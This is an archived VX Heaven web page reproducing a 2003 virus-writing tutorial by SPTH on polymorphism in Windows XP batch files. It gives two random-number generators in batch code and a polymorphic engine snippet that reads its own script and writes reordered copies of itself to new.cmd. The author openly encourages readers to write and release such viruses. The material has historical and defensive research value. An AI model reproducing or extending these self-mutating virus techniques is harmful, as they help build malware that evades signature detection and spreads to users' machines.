<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> SPTH 'Polymorphism in BatXP' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="SPTH"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, SPTH,Polymorphism in BatXP, virus, aaaa, number, find, polyst, bbbb, cccc, dddd, batxp, write, file, finish, easy, numbers, error"/>
<meta name="Description" content="After writing 2 different polymorph BatXP viriis I thought, that I should write a tutorial about this, because I've never seen an other poly BatXP virus (ok, i just saw two other BatXP viruses) ;)In this tutorial I'll explain how to write such a virus. I hope, that I'll see some of this viruses in the near future out there."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"8fc4618cdbcc66bbb514524bfe7ba6521f29f260-1498756988-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vsp19.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Polymorphism in BatXP</h1><p><a href="/lib/?lang=en&amp;author=SPTH"> SPTH</a><br/> <em><a href="/vx.php?fid=1207#f1207">Coderz [3]</a></em><br/> <em>January 2003</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vsp19.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=MA#vsp19">Back to index</a>] [<a href="/lib/vsp19.html#disqus_thread">Comments</a>]<br/> 
<p>After writing 2 different polymorph BatXP viriis I thought, that I should write a tutorial about this, because I've never seen an other poly BatXP virus (ok, i just saw two other BatXP viruses) ;)</p>
<p>In this tutorial I'll explain how to write such a virus. I hope, that I'll see some of this viruses in the near future out there.</p>
<p>OK, now let me explain how to make such things: Every poly virus need random numbers. I think, it's the biggest problem to find random numbers. If you have random-numbers, it's easy to make the virus polymorph.</p>
<p>Now I'll show u two ways of getting random number in BatXP:</p>
<h2>Random Numbers via time</h2>
<p>The idea of such an random number generator was tooken from a code of philet0ast3r/[rRlf]! Very thank ya!!!</p>
<div class="dos" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> aa=0<br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> tm=0<br/>
:<span style="color: #b100b1; font-weight: bold;">start</span><br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/if.html"><span style="color: #00b100; font-weight: bold;">if</span></a> <span style="color: #33cc33;">%</span><span style="color: #448888;">aa</span><span style="color: #33cc33;">%</span> <a style="color: #000060;" href="http://www.ss64.com/nt/equ.html"><span style="color: #000000; font-weight: bold;">EQU</span></a> 5 <a style="color: #000060;" href="http://www.ss64.com/nt/goto.html"><span style="color: #00b100; font-weight: bold;">goto</span></a> writeply<br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> /a aa=<span style="color: #33cc33;">%</span><span style="color: #448888;">aa</span><span style="color: #33cc33;">%</span>+1<br/>
:<span style="color: #b100b1; font-weight: bold;">polyst</span><br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/if.html"><span style="color: #00b100; font-weight: bold;">if</span></a> <span style="color: #33cc33;">%</span><span style="color: #448888;">tm</span><span style="color: #33cc33;">%</span> <a style="color: #000060;" href="http://www.ss64.com/nt/equ.html"><span style="color: #000000; font-weight: bold;">EQU</span></a> 9 <a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> tm=0<br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> /a tm=<span style="color: #33cc33;">%</span><span style="color: #448888;">tm</span><span style="color: #33cc33;">%</span>+1<br/>
ver<span style="color: #33cc33;">|</span>time<span style="color: #33cc33;">|</span>find &quot;,<span style="color: #33cc33;">%</span><span style="color: #448888;">tm</span><span style="color: #33cc33;">%</span>&quot;<span style="color: #33cc33;">&gt;</span><a style="color: #000060;" href="http://www.ss64.com/nt/nul.html"><span style="color: #0000ff; font-weight: bold;">nul</span></a><br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/if.html"><span style="color: #00b100; font-weight: bold;">if</span></a> <a style="color: #000060;" href="http://www.ss64.com/nt/not.html"><span style="color: #000000; font-weight: bold;">not</span></a> <a style="color: #000060;" href="http://www.ss64.com/nt/errorlevel.html"><span style="color: #000000; font-weight: bold;">errorlevel</span></a> 1 <span style="color: #33cc33;">(</span><br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> number<span style="color: #33cc33;">%</span><span style="color: #448888;">aa</span><span style="color: #33cc33;">%</span>=<span style="color: #33cc33;">%</span><span style="color: #448888;">tm</span><span style="color: #33cc33;">%</span><br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/goto.html"><span style="color: #00b100; font-weight: bold;">goto</span></a> start<br/>
<span style="color: #33cc33;">)</span><br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/goto.html"><span style="color: #00b100; font-weight: bold;">goto</span></a> polyst<br/>
:<span style="color: #b100b1; font-weight: bold;">writeply</span><br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/echo.html"><span style="color: #b1b100; font-weight: bold;">echo</span></a> <span style="color: #33cc33;">%</span><span style="color: #448888;">number1</span><span style="color: #33cc33;">%</span> <span style="color: #33cc33;">%</span><span style="color: #448888;">number2</span><span style="color: #33cc33;">%</span> <span style="color: #33cc33;">%</span><span style="color: #448888;">number3</span><span style="color: #33cc33;">%</span> <span style="color: #33cc33;">%</span><span style="color: #448888;">number4</span><span style="color: #33cc33;">%</span> <span style="color: #33cc33;">%</span><span style="color: #448888;">number5</span><span style="color: #33cc33;">%</span><br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/pause.html"><span style="color: #b1b100; font-weight: bold;">pause</span></a><br/>
&nbsp;</div>
<p>I'm going to explain every line:</p>
<dl>
<dt><code>set aa=0</code></dt><dd>"aa" is the second part of our random-variable. U may wonder why i set aa=0 at the begin. But it's easy: CMD will calculate with it, and if I didn't write this, the variable would be nothing. If CMD calculates with nothing, there will be a error and the program stops. I don't want that, do you? ;)</dd>
<dt><code>set tm=0</code></dt><dd>"tm" is our time variable. It's used to find a random-number. I set tm=0 because of the same reason as "aa".</dd>
<dt><code>:start</code></dt><dd>Our start-lable. Now the program begins to search for random numbers.</dd>
<dt><code>if %aa% EQU 5 goto writeply</code></dt><dd>The program searchs for 5 random-numbers. And I told u, that "aa" is the second part of the random-variable. EQU is the same as "=". So if "aa" is 5, the program should show us the random-numbers. Because of that we jump to the "writeply"-lable.</dd>
<dt><code>set /a aa=%aa%+1</code></dt><dd>The parameter "/a" says, that the command shall calculate. What's to calculate? "aa"+1. That's all. At first time "aa" is zero. now we add one to zero (first time): 0+1=1 now "aa" is 1, than 2, 3, 4, 5! Now take a look at the last line and you'll know, what's than!</dd>
<dt><code>:polyst</code></dt><dd>Another lable. The program will jump to this lable, if it find's no poly number. Than the searching starts again.</dd>
<dt><code>if %tm% EQU 9 set tm=0</code></dt><dd>I told you, that "tm" is the time varible. And because we just want numbers from 1 to 9, we set tm=0 if it's 9!</dd>
<dt><code>set /a tm=%tm%+1</code></dt><dd>Once more the parameter "/a" which sais, that we wanna calculate. This line is the same as: "new-tm"="old-tm"+1! If we don't do this, our time-var is everytime zero, and also the random numbers are zero.</dd>
<dt><code>ver|time|find ",%tm%">nul</code></dt><dd>It's the main-part of the whole random-number generator. This line compare the dezisecond of the moment with "tm". If there's any error, the error won't printed to the screen because of ">nul"!</dd>
<dt><code>if not errorlevel 1 (</code></dt><dd>if the dezisecond is the same as "tm", the next two command will start.</dd>
<dt><code>set number%aa%=%tm%</code></dt><dd>the variable number"aa" (one of the 5 random numbers) is "tm"!</dd>
<dt><code>goto start</code></dt><dd>Here we jump to the start for searching more random-numbers!</dd>
<dt><code>)</code></dt><dd>It's like "end if"!</dd>
<dt><code>goto polyst</code></dt><dd>The program wasn't able to find a number, so it search again for one.</dd>
<dt><code>:writeply</code></dt><dd>It's the last lable! The program will jump to it, if there are 5 random numbers found.</dd>
<dt><code>echo %number1% %number2% %number3% %number4% %number5%</code></dt><dd>Here the program prints the 5 random number to the screen.</dd>
<dt><code>pause</code></dt><dd>It's just 4 u! CMD would close, if it has finished everything. And because we wanna have a look at the numbers, we don't want that.</dd>
</dl>
<p>This number generator has only 297 Bytes. And it's no problem to make more random-numbers. And it's also possible to use this # generator in normal batch ( you have to rewrite most of the program, but the main things are the same). The only bad is, that's hard to understand. ;)</p>
<h2>Random Numbers via %random%</h2>
<p>The new BatXP use a command named "%random%". %random% is a random nmber between 1 and 32767! This number is to big for our random-engine! so what to do? We must make it smaller! ;)</p>
<p>The following code was tooked from BatXP.Saturn by me!</p>
<div class="dos" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> aa=0<br/>
:<span style="color: #b100b1; font-weight: bold;">start</span><br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/if.html"><span style="color: #00b100; font-weight: bold;">if</span></a> <span style="color: #33cc33;">%</span><span style="color: #448888;">aa</span><span style="color: #33cc33;">%</span> <a style="color: #000060;" href="http://www.ss64.com/nt/equ.html"><span style="color: #000000; font-weight: bold;">EQU</span></a> 5 <a style="color: #000060;" href="http://www.ss64.com/nt/goto.html"><span style="color: #00b100; font-weight: bold;">goto</span></a> writeply<br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> /a aa=<span style="color: #33cc33;">%</span><span style="color: #448888;">aa</span><span style="color: #33cc33;">%</span>+1<br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> a=<span style="color: #33cc33;">%</span><span style="color: #448888;">random</span><span style="color: #33cc33;">%</span><br/>
:<span style="color: #b100b1; font-weight: bold;">polyst</span><br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/if.html"><span style="color: #00b100; font-weight: bold;">if</span></a> <span style="color: #33cc33;">%</span><span style="color: #448888;">a</span><span style="color: #33cc33;">%</span> <a style="color: #000060;" href="http://www.ss64.com/nt/geq.html"><span style="color: #000000; font-weight: bold;">GEQ</span></a> 50 <span style="color: #33cc33;">(</span><a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> /A a=<span style="color: #33cc33;">%</span><span style="color: #448888;">a</span><span style="color: #33cc33;">%</span>/2<span style="color: #33cc33;">)</span><br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/if.html"><span style="color: #00b100; font-weight: bold;">if</span></a> <span style="color: #33cc33;">%</span><span style="color: #448888;">a</span><span style="color: #33cc33;">%</span> <a style="color: #000060;" href="http://www.ss64.com/nt/leq.html"><span style="color: #000000; font-weight: bold;">LEQ</span></a> 40 <span style="color: #33cc33;">(</span><a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> /A a=<span style="color: #33cc33;">%</span><span style="color: #448888;">a</span><span style="color: #33cc33;">%</span>+10<span style="color: #33cc33;">)</span><br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/if.html"><span style="color: #00b100; font-weight: bold;">if</span></a> <span style="color: #33cc33;">%</span><span style="color: #448888;">a</span><span style="color: #33cc33;">%</span> <a style="color: #000060;" href="http://www.ss64.com/nt/geq.html"><span style="color: #000000; font-weight: bold;">GEQ</span></a> 50 <span style="color: #33cc33;">(</span><a style="color: #000060;" href="http://www.ss64.com/nt/goto.html"><span style="color: #00b100; font-weight: bold;">goto</span></a> polyst<span style="color: #33cc33;">)</span><br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/if.html"><span style="color: #00b100; font-weight: bold;">if</span></a> <span style="color: #33cc33;">%</span><span style="color: #448888;">a</span><span style="color: #33cc33;">%</span> <a style="color: #000060;" href="http://www.ss64.com/nt/lss.html"><span style="color: #000000; font-weight: bold;">LSS</span></a> 40 <span style="color: #33cc33;">(</span><a style="color: #000060;" href="http://www.ss64.com/nt/goto.html"><span style="color: #00b100; font-weight: bold;">goto</span></a> polyst<span style="color: #33cc33;">)</span><br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> /A number<span style="color: #33cc33;">%</span><span style="color: #448888;">aa</span><span style="color: #33cc33;">%</span>=<span style="color: #33cc33;">%</span><span style="color: #448888;">a</span><span style="color: #33cc33;">%</span>-40<br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/goto.html"><span style="color: #00b100; font-weight: bold;">goto</span></a> start<br/>
:<span style="color: #b100b1; font-weight: bold;">writeply</span><br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/echo.html"><span style="color: #b1b100; font-weight: bold;">echo</span></a> <span style="color: #33cc33;">%</span><span style="color: #448888;">number1</span><span style="color: #33cc33;">%</span> <span style="color: #33cc33;">%</span><span style="color: #448888;">number2</span><span style="color: #33cc33;">%</span> <span style="color: #33cc33;">%</span><span style="color: #448888;">number3</span><span style="color: #33cc33;">%</span> <span style="color: #33cc33;">%</span><span style="color: #448888;">number4</span><span style="color: #33cc33;">%</span> <span style="color: #33cc33;">%</span><span style="color: #448888;">number5</span><span style="color: #33cc33;">%</span><br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/pause.html"><span style="color: #b1b100; font-weight: bold;">pause</span></a><br/>
&nbsp;</div>
<p>Now I'll explain every line again!</p>
<dl>
<dt><code>set aa=0</code></dt><dd>We use it for the same reason as in the other poly-generator. It's the second part of our random numbers. And we need this variable 4 calculate.</dd>
<dt><code>:start</code></dt><dd>This is the start-lable. The program need it for searching random numbers.</dd>
<dt><code>if %aa% EQU 5 goto writeply</code></dt><dd>The program checks, if "aa"=5! If yes, than 5 numbers still exist, and it jump to the lable "writeply"</dd>
<dt><code>set /a aa=%aa%+1</code></dt><dd>It's nothing else as "set /calculate "new-aa"="old-aa"+1 The program checks with this way, how much numbers still exists!</dd>
<dt><code>set a=%random%</code></dt><dd>This is the most important line in the progam. Now the variable "a" is a number between 1 and 32767!</dd>
<dt><code>:polyst</code></dt><dd>It's the next lable. The program jumps to it, if the number is higher than 50 or lower than 40. U will understand it after reading the whole thing.</dd>
<dt><code>if %a% GEQ 50 (set /A a=%a%/2)</code></dt><dd>It's the same as "if %a% >= 50 ..." OK, we said, the random number is to big, so we want to make it smaller. First the program checks, if it's to big. If yes, it div the variable with 2! So you can make the variable smaller.</dd>
<dt><code>if %a% LEQ 40 (set /A a=%a%+10)</code></dt><dd>It's "if %a% =&lt; 40..." Last line we made the variable smaller. It could be, that the our number is too small. So, if the varible is too small, we add 10 to it!</dd>
<dt><code>if %a% GEQ 50 (goto polyst)</code></dt><dd>We want our random number to be between 40 and 50! If "a" isn't so, we go to polyst and to the same again.</dd>
<dt><code>if %a% LSS 40 (goto polyst)</code></dt><dd>LSS is the same as "&lt;". Now we'll check, if "a" is smaller than 40. If yes, we go to polyst.</dd>
<dt><code>set /A number%aa%=%a%-40</code></dt><dd>Our "a" is between 40 and 50 now. OK, that's good. We make a new varible named "number%aa%". You have to know, that the "aa" is a number. For instanze:
<ol>
<li>random number: aa=1</li>
<li>random number: aa=2</li>
</ol>I hope, u understand it. You may ask why "-40"! OK, the "a" is a number between 40 and 50. But the end-variable shall be a number between 0 and 10. We have only to sub 40! ;)</dd>
<dt><code>goto start</code></dt><dd>Jump to the lable which searchs for another random number.</dd>
<dt><code>:writeply</code></dt><dd>If the program finds 5 random numbers, it will write them to the screen. Because of that it jumps to this lable.</dd>
<dt><code>echo %number1% %number2% %number3% %number4% %number5%</code></dt><dd>Output the 5 random numbers to the screen.</dd>
<dt><code>pause</code></dt><dd>BatXP closes the DOS-Windows, if nothing more is to do. With this command it waits until the user press any key.</dd>
</dl>
<p>This file has 323 Bytes. It's very easy to add more numbers. But it's not possible to use it with normal Batch. And I think, this rnd-sample is easy to understand.</p>
<h2>BatXP poly example</h2>
<p>Now we know how to make random numbers. But I think, we don't know how to make a polymorph BatXP virus with this numbers. I wanna explain one way to change the code of the virus every generation. There could be more ways, but I was to lazy to search others.</p>
<p>This one way mixes the code every generation: What's to do while using this techique? You have to add every line of the poly-engine the string "% aaaa %".</p>
<div class="dos" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #33cc33;">&lt;</span> The changed poly-engine <span style="color: #33cc33;">&gt;</span><br/>
find &quot;aaaa&quot;<span style="color: #33cc33;">&lt;%</span><span style="color: #448888;">0</span><span style="color: #33cc33;">&gt;&gt;</span>new.cmd<br/>
<span style="color: #33cc33;">%</span><span style="color: #448888;">aaaa</span><span style="color: #33cc33;">%</span><a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> ra=0<br/>
<span style="color: #33cc33;">%</span><span style="color: #448888;">aaaa</span><span style="color: #33cc33;">%</span><a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> rb=0<br/>
<span style="color: #33cc33;">%</span><span style="color: #448888;">aaaa</span><span style="color: #33cc33;">%</span><a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> /a ra=<span style="color: #33cc33;">%</span><span style="color: #448888;">number1</span><span style="color: #33cc33;">%</span>+<span style="color: #33cc33;">%</span><span style="color: #448888;">number2</span><span style="color: #33cc33;">%</span><br/>
<span style="color: #33cc33;">%</span><span style="color: #448888;">aaaa</span><span style="color: #33cc33;">%</span><a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> /a rb=<span style="color: #33cc33;">%</span><span style="color: #448888;">number3</span><span style="color: #33cc33;">%</span>+number4<span style="color: #33cc33;">%</span><br/>
<span style="color: #33cc33;">%</span><span style="color: #448888;">aaaa</span><span style="color: #33cc33;">%</span><a style="color: #000060;" href="http://www.ss64.com/nt/if.html"><span style="color: #00b100; font-weight: bold;">If</span></a> <span style="color: #33cc33;">%</span><span style="color: #448888;">ra</span><span style="color: #33cc33;">%</span> <a style="color: #000060;" href="http://www.ss64.com/nt/geq.html"><span style="color: #000000; font-weight: bold;">GEQ</span></a> <span style="color: #33cc33;">%</span><span style="color: #448888;">rb</span><span style="color: #33cc33;">%</span> <a style="color: #000060;" href="http://www.ss64.com/nt/goto.html"><span style="color: #00b100; font-weight: bold;">goto</span></a> ra<br/>
<span style="color: #33cc33;">%</span><span style="color: #448888;">aaaa</span><span style="color: #33cc33;">%</span><a style="color: #000060;" href="http://www.ss64.com/nt/goto.html"><span style="color: #00b100; font-weight: bold;">goto</span></a> rb<br/>
<br/>
:<span style="color: #b100b1; font-weight: bold;">ra</span> &nbsp; &nbsp; <span style="color: #33cc33;">%</span><span style="color: #448888;">bbbb</span><span style="color: #33cc33;">%</span><br/>
<span style="color: #33cc33;">%</span><span style="color: #448888;">bbbb</span><span style="color: #33cc33;">%</span><a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> b=b<br/>
<span style="color: #33cc33;">%</span><span style="color: #448888;">bbbb</span><span style="color: #33cc33;">%</span><a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> c=c<br/>
<span style="color: #33cc33;">%</span><span style="color: #448888;">bbbb</span><span style="color: #33cc33;">%</span>find &quot;<span style="color: #33cc33;">%</span><span style="color: #448888;">b</span><span style="color: #33cc33;">%</span>bbb&quot;<span style="color: #33cc33;">&lt;%</span><span style="color: #448888;">0</span><span style="color: #33cc33;">&gt;&gt;</span>new.cmd<br/>
<span style="color: #33cc33;">%</span><span style="color: #448888;">bbbb</span><span style="color: #33cc33;">%</span>find &quot;<span style="color: #33cc33;">%</span><span style="color: #448888;">c</span><span style="color: #33cc33;">%</span>ccc&quot;<span style="color: #33cc33;">&lt;%</span><span style="color: #448888;">0</span><span style="color: #33cc33;">&gt;&gt;</span>new.cmd<br/>
<span style="color: #33cc33;">%</span><span style="color: #448888;">bbbb</span><span style="color: #33cc33;">%</span><a style="color: #000060;" href="http://www.ss64.com/nt/goto.html"><span style="color: #00b100; font-weight: bold;">goto</span></a> finish<br/>
<br/>
:<span style="color: #b100b1; font-weight: bold;">rb</span> &nbsp; &nbsp; <span style="color: #33cc33;">%</span><span style="color: #448888;">cccc</span><span style="color: #33cc33;">%</span><br/>
<span style="color: #33cc33;">%</span><span style="color: #448888;">cccc</span><span style="color: #33cc33;">%</span><a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> b=b<br/>
<span style="color: #33cc33;">%</span><span style="color: #448888;">cccc</span><span style="color: #33cc33;">%</span><a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> c=c<br/>
<span style="color: #33cc33;">%</span><span style="color: #448888;">cccc</span><span style="color: #33cc33;">%</span>find &quot;<span style="color: #33cc33;">%</span><span style="color: #448888;">c</span><span style="color: #33cc33;">%</span>ccc&quot;<span style="color: #33cc33;">&lt;%</span><span style="color: #448888;">0</span><span style="color: #33cc33;">&gt;&gt;</span>new.cmd<br/>
<span style="color: #33cc33;">%</span><span style="color: #448888;">cccc</span><span style="color: #33cc33;">%</span>find &quot;<span style="color: #33cc33;">%</span><span style="color: #448888;">b</span><span style="color: #33cc33;">%</span>bbb&quot;<span style="color: #33cc33;">&lt;%</span><span style="color: #448888;">0</span><span style="color: #33cc33;">&gt;&gt;</span>new.cmd<br/>
<span style="color: #33cc33;">%</span><span style="color: #448888;">cccc</span><span style="color: #33cc33;">%</span><a style="color: #000060;" href="http://www.ss64.com/nt/goto.html"><span style="color: #00b100; font-weight: bold;">goto</span></a> finish<br/>
<br/>
:<span style="color: #b100b1; font-weight: bold;">finish</span> <span style="color: #33cc33;">%</span><span style="color: #448888;">dddd</span><span style="color: #33cc33;">%</span><br/>
find &quot;dddd&quot;<span style="color: #33cc33;">&lt;%</span><span style="color: #448888;">0</span><span style="color: #33cc33;">&gt;&gt;</span>new.cmd<br/>
&nbsp;</div>
<p>It's only a quite easy exaple and I think, you'll understand it. What does this code? Writing a new file named "new.cmd". First it writes the lines with "aaaa" to the file. Then the random-part! If the rnd-number 1 and 2 are bigger than rnd-number 2 and 3 then it writes the "bbbb"-lines and then the "cccc"-one to the file. Else first the "cccc" and then the "bbbb". In the end of the code it writes the "dddd"-code to the file. The "dddd"'s are the finish part. Just the finish lable. I tested the program with WinXP and it worked. ;)</p>
<h2>Last words</h2>
<p>It should be no problem to use this technique. It's also possible to write a virus with more than 10.000.000.000 different ways (no, the virus won't have 1 MB). I will be happy, if you write a virus with help of this tutorial. If you have questions, suggestions or something else, pls write me a mail.</p>
<pre>
							- - - - - - - - - - - - - - -
							  Second Part To Hell/[rRlf]  
							  www.spth.de.vu
							  <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="dfacafabb79fbeb0b1b2beb6b3f1beab">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
							  written in jan. 2003
							  Austria
							- - - - - - - - - - - - - - - </pre>[<a style="" href="/lib/?lang=EN&amp;index=MA#vsp19">Back to index</a>] [<a href="/lib/vsp19.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vsp19">de</a><a href="/lib/index.php?lang=en&amp;id=vsp19">en</a><a href="/lib/index.php?lang=es&amp;id=vsp19">es</a><a href="/lib/index.php?lang=it&amp;id=vsp19">it</a><a href="/lib/index.php?lang=fr&amp;id=vsp19">fr</a><a href="/lib/index.php?lang=pl&amp;id=vsp19">pl</a><a href="/lib/index.php?lang=ru&amp;id=vsp19">ru</a><a href="/lib/index.php?lang=ua&amp;id=vsp19">ua</a></div>
</body>
</html>
